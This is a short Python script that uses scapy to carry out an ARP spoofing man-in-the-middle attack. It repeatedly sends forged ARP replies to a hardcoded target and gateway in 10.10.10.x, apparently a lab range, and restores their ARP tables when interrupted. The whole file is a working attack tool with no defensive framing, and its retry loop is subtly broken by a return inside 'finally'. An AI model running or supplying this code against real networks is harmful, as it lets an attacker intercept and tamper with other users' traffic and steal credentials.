import scapy.all as scapy
from scapy.layers.l2 import ARP, Ether
import time


def get_mac(ip):
    mac = "x"
    while mac == "x":
        try:
            arp_request = ARP(pdst=ip)
            broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
            arp_request_broadcast = broadcast / arp_request
            answered_list = scapy.srp(arp_request_broadcast, timeout=5, verbose=False)[0]
            mac = answered_list[0][1].hwsrc
        except:
            print("Mac not found")
        finally:
            return mac


def spoof(t_ip, spoof_ip):
    packet = ARP(op="is-at", pdst=t_ip, hwdst=get_mac(t_ip), psrc=spoof_ip)
    scapy.send(packet, verbose=False)


def restore(dst_ip, src_ip):
    packet = ARP(op="is-at", pdst=dst_ip, hwdst=get_mac(dst_ip), psrc=src_ip, hwsrc=get_mac(src_ip))
    scapy.send(packet, verbose=False)


if __name__ == '__main__':

    target_ip = "10.10.10.20"
    gateway_ip = "10.10.10.254"

    try:
        counter = 0
        while True:
            spoof(target_ip, gateway_ip)
            spoof(gateway_ip, target_ip)
            counter += 2
            print("\rPackets sent " + str(counter), end="")
            time.sleep(2)

    except KeyboardInterrupt:
        print("\nSpoofing stopped")
        restore(gateway_ip, target_ip)
        restore(target_ip, gateway_ip)
        print("Addresses restored")
